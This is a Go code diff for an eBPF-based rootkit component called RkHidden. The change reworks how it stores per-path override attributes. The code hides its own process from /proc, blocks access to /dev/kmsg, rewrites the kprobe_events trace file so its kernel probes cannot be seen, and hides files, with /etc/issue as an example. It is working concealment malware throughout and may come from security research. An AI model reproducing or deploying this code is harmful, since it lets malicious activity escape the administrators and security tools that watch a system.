@@ -6,24 +6,15 @@ import (
 	"io"
 	"io/ioutil"
 	"os"
+	"path"
 	"path/filepath"
 	"strconv"
 	"strings"
 	"time"
 
-	"github.com/mattn/go-zglob"
-
 	"github.com/DataDog/ebpf"
 	"github.com/DataDog/ebpf/manager"
 )
-
-func (rk *RkHidden) GetProcPaths(pid int) []string {
-	matches, err := zglob.Glob(fmt.Sprintf("/proc/%d/**", pid))
-	if err != nil {
-		return nil
-	}
-	return matches
-}
 
 func (rk *RkHidden) GetRkFdKeys(path string) []RkFdKey {
 	matches, err := filepath.Glob("/proc/*/fd/*")
@@ -65,6 +56,8 @@ type RkHidden struct {
 	KprobeEvents []byte
 
 	HandleError func(err error)
+
+	pathAttr map[RkPathKey]RkPathAttr
 }
 
 func (rk *RkHidden) Kmsg(str string) {
@@ -103,13 +96,23 @@ func (rk *RkHidden) PutFdContent(m *ebpf.Map, id uint64, reader io.Reader) {
 	}
 }
 
-func (rk *RkHidden) PutPathAttr(m *ebpf.Map, path string, attr PathAttr) {
-	var zeroAttr PathAttr
+func (rk *RkHidden) PutPathAttr(m *ebpf.Map, path string, attr RkPathAttr) {
+	var zeroAttr RkPathAttr
+
 	for i, key := range RkPathKeys(path) {
 		if i == 0 {
+			prev, ok := rk.pathAttr[key]
+			if ok {
+				attr.Action = attr.Action | prev.Action
+				attr.ReturnValue = attr.ReturnValue | prev.ReturnValue
+				attr.HiddenHash = attr.HiddenHash | prev.HiddenHash
+			}
+
 			if err := m.Put(key.Bytes(), attr.Bytes()); err != nil {
 				rk.HandleError(err)
 			}
+
+			rk.pathAttr[key] = attr
 		} else {
 			if err := m.Put(key.Bytes(), zeroAttr.Bytes()); err != nil {
 				rk.HandleError(err)
@@ -139,8 +142,8 @@ func (rk *RkHidden) BlockKmsg() []RkFdKey {
 	}
 
 	// block process that will open kmsg
-	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_keys")
-	attr := PathAttr{
+	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
+	attr := RkPathAttr{
 		FSType: "devtmpfs",
 		Action: OverrideReturn,
 	}
@@ -168,13 +171,13 @@ func (rk *RkHidden) UnBlockKsmg(rkFdKeys []RkFdKey) {
 func (rk *RkHidden) OverrideContent(fsType string, path string, reader io.Reader) {
 	id := FNVHashStr(fsType + "/" + path)
 
-	attr := PathAttr{
+	attr := RkPathAttr{
 		FSType:     "tracefs",
 		Action:     OverrideContent,
 		OverrideID: id,
 	}
 
-	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_keys")
+	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
 	rk.PutPathAttr(pathKeysMap, path, attr)
 
 	contentsMap, _, _ := rk.MainManager.GetMap("rk_fd_contents")
@@ -182,25 +185,27 @@ func (rk *RkHidden) OverrideContent(fsType string, path string, reader io.Reader
 }
 
 func (rk *RkHidden) OverrideReturn(fsType string, path string, value int64) {
-	attr := PathAttr{
+	attr := RkPathAttr{
 		FSType:      fsType,
 		Action:      OverrideReturn,
 		ReturnValue: value,
 	}
 
-	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_keys")
+	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
 	rk.PutPathAttr(pathKeysMap, path, attr)
 }
 
 func (rk *RkHidden) HideFile(fsType string, dir string, file string) {
-	attr := PathAttr{
+	attr := RkPathAttr{
 		FSType:     fsType,
 		Action:     HideFile,
 		HiddenHash: FNVHashStr(file),
 	}
 
-	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_keys")
+	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
 	rk.PutPathAttr(pathKeysMap, dir, attr)
+
+	rk.OverrideReturn(fsType, path.Join(dir, file), -2)
 }
 
 func (rk *RkHidden) InitOverride() {
@@ -264,10 +269,10 @@ func (rk *RkHidden) InitOverride() {
 	}
 	rk.MainManager.UpdateTailCallRoutes(routes...)
 
-	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_keys")
+	pathKeysMap, _, _ := rk.MainManager.GetMap("rk_path_attrs")
 
 	// kmsg override
-	attr := PathAttr{
+	attr := RkPathAttr{
 		FSType: "devtmpfs",
 		Action: KMsgProg,
 	}
@@ -277,11 +282,10 @@ func (rk *RkHidden) InitOverride() {
 	rk.OverrideContent("tracefs", "kprobe_events", bytes.NewReader(rk.KprobeEvents))
 
 	// proc override
-	/*for _, path := range rk.GetProcPaths(os.Getpid()) {
-		rk.OverrideReturn("proc", strings.TrimPrefix(path, "/proc/"), -2)
-	}*/
-	rk.OverrideReturn("proc", strconv.Itoa(os.Getpid()), -2)
-	rk.HideFile("proc", "/", strconv.Itoa(os.Getpid()))
+	rk.HideFile("proc", "", strconv.Itoa(os.Getpid()))
+
+	// example
+	rk.HideFile("ext4", "etc", "issue")
 }
 
 func (rk *RkHidden) Start() {
@@ -341,5 +345,6 @@ func NewRkHidden() *RkHidden {
 		MainManager:     &manager.Manager{Probes: MainProbes},
 		OverrideManager: &manager.Manager{Probes: OverrideProbes},
 		HandleError:     HandleError,
+		pathAttr:        make(map[RkPathKey]RkPathAttr),
 	}
 }
